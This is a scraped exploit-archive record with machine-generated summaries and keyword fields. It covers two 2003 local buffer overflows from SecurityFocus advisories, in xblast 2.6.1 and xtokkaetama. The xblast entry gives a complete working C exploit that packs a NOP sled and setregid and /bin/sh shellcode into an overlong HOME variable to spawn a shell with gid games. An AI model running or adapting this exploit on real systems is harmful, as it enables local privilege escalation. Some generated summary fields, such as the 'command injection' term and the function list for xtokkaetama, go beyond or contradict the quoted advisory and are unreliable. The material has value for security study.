// #<-- Publish Date --># // 2003-07-28 // #<-- Technical Document Summary (TDS) --># // The exploit leverages a locally exploitable buffer overflow caused by insufficient bounds checking of data supplied via the HOME environment variable. This vulnerability permits a local user to execute code with a gid of games. The affected component is the xblast 2.6.1 binary on Linux systems. Exploitation was tested against xblast-2.6.beta-1.i386.rpm under Red Hat Linux 9.0. The vulnerability stems from improper validation of the HOME variable length during environment setup. Not specified in source. // #<-- Layman's Document Summary (LDS) --># // The weakness is a buffer overflow in the xblast local exploit code where input data isn't limited. It allows an attacker to run malicious code on the system. The affected component is the HOME environment variable handling within xblast. Not specified in source. // #<-- Key Words (KW) --># // xblast, HOME environment variable, buffer overflow, local exploit, gid of games, Red Hat Linux 9.0, Outsider Security Labs, 0x333, shellcode, setenv, memret, exec // #<-- Related Terms --># // buffer overflow, local privilege escalation, environment variable injection, Red Hat Linux, xblast, exploit, kernel bypass, vulnerability classification // #<-- Entities/Attributes --># // Software: xblast Version: 2.6.1 Platform: Linux Architecture: i386 File path: /usr/X11R6/bin/xblast Vulnerability: HOME environment variable size check Not specified in source // #<-- Vulnerability Type --># // Not specified in source // #<-- Original Content --># // source: https://www.securityfocus.com/bid/8296/info XBlast is contains a locally exploitable buffer overflow vulnerability due to insufficient bounds checking of data supplied via the HOME environment variable. Successful exploitation would allow a local user to execute code with a gid of games. /* 0x333xblast => xblast 2.6.1 local exploit * * xblast could be overflowed by passing a long $HOME * env. For more info read advisory @ : * * http://www.0x333.org/advisories/outsider-003.txt * * * note * : * exploit tested against xblast-2.6.beta-1.i386.rpm * under Red Hat Linux 9.0. xblaste is not install * by default +s. * * coded by c0wboy * * (c) 0x333 Outsider Security Labs / www.0x333.org * */ #include <stdio.h> #include <string.h> #include <unistd.h> #define BIN "/usr/X11R6/bin/xblast" #define SIZE 1032 #define RET 0xbffffb38 #define NOP 0x90 unsigned char shellcode[] = /* setregid (20,20) shellcode */ "\x31\xc0\x31\xdb\x31\xc9\xb3\x14\xb1\x14\xb0\x47" "\xcd\x80" /* exec /bin/sh shellcode */ "\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62" "\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"; void banner (void); void memret (char *, int, int, int); void banner (void) { fprintf (stdout, "

 --- xblast local exploit by c0wboy ---
"); fprintf (stdout, " --- Outsiders Se(c)urity Labs / www.0x333.org ---

"); fprintf (stdout, " [NOW PRESS 'y' TO SPAWN THE SHELL]

"); } void memret (char *buffer, int ret, int size, int align) { int i; int * ptr = (int *) (buffer + align); for (i=0; i<size; i+=4) *ptr++ = ret; ptr = 0x0; } int main () { int ret = RET; char out[SIZE]; memret ((char *)out, ret, SIZE-1, 0); memset ((char *)out, NOP, 333); memcpy ((char *)out+333, shellcode, strlen(shellcode)); setenv ("HOME", out, 1); banner (); execl (BIN, BIN, 0x0); }

// #<-- Publish Date --># // 2003-08-04 // #<-- Technical Document Summary (TDS) --># // The vulnerability stems from insufficient bounds checking on the '-nickname' command-line argument, allowing a local buffer overflow. This weakness permits arbitrary code execution within the software's context. The affected component is the xtokkaetama game binary installed with setgid 'games'. No successful exploitation is demonstrated in the source. // #<-- Layman's Document Summary (LDS) --># // The flaw allows an attacker to crash the program or execute malicious code by sending a specially crafted nickname string that overflows the buffer. It is a local buffer overflow issue caused by improper input validation. The exploit targets the xtama_score.c function at line 132, where strcpy and sscanf lack proper length restrictions. // #<-- Key Words (KW) --># // exploit, buffer overflow, local, setgid, games, Xtokkaetama, strncpy, sscanf, exec, nickname, local buffer overflow, command line option // #<-- Related Terms --># // buffer overflow, local vulnerability, command injection, input validation flaw, exploit technique, software exploitation, operating system setgid, Linux binary, function strcpy, function sscanf // #<-- Entities/Attributes --># // Software: xtokkaetama (version 1.0b+) // Product name: Xtokkaetama // Vendor: fakehalo.deadpig.org // Kernel: Linux/x86 // File path: /usr/games/xtokkaetama // Functions: memset, strcat, getgrnam, execle // Environment variable: EXEC // CVE identifiers: Not specified in source // #<-- Vulnerability Type --># // Local buffer overflow // Not specified in source // #<-- Original Content --># // source: https://www.securityfocus.com/bid/8337/info xtokkaetama is prone to a locally exploitable buffer overflow vulnerability. This is due to insufficient bounds checking of the '-nickname' command line option, which could result in execution of arbitrary code in the context of the software. The software is typically installed setgid 'games'.